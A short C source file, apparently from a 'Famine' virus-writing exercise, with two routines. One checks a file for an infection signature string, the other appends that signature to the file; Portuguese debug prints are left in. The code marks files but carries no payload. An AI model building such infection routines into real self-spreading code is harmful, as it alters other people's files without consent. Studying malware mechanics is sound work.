#include "famine.h"

bool    check_infection(FILE *fp, const char *string, size_t len)
{
    printf("\nola\n\n");
    int ch;
    char buffer[2024];
    size_t buf_index = 0;
    while ((ch = fgetc(fp)) != EOF)
    {
        if (isprint(ch))
        {
            if (buf_index < sizeof(buffer) - 1)  // Leave room for null terminator
                buffer[buf_index++] = ch;
            else
            {
                printf("entrei nesta merda %lu \n", buf_index);
                // Shift buffer left to make room for new char
                memmove(buffer, buffer + 1, sizeof(buffer) - 2);
                buffer[sizeof(buffer) - 2] = ch;
            }
        }
        else 
        {
            if (buf_index >= len)
            {
                buffer[buf_index] = '\0';
                if(strstr(buffer, string))
                {
                    printf("\nbuffer = %s\n\n", buffer);                    
                    return (true);
                }
            }
            buf_index = 0;
        }

    }
    buffer[buf_index] = '\0';
    if(strstr(buffer, string))
    {
        printf("\nbuffer = %s\n\n", buffer);
        return (true);
    }
    return (false);
}

void    infect(FILE *fp, const char *string, size_t len)
{
    fwrite(string, sizeof(char), len, fp);
    printf("INFECT.\n");
}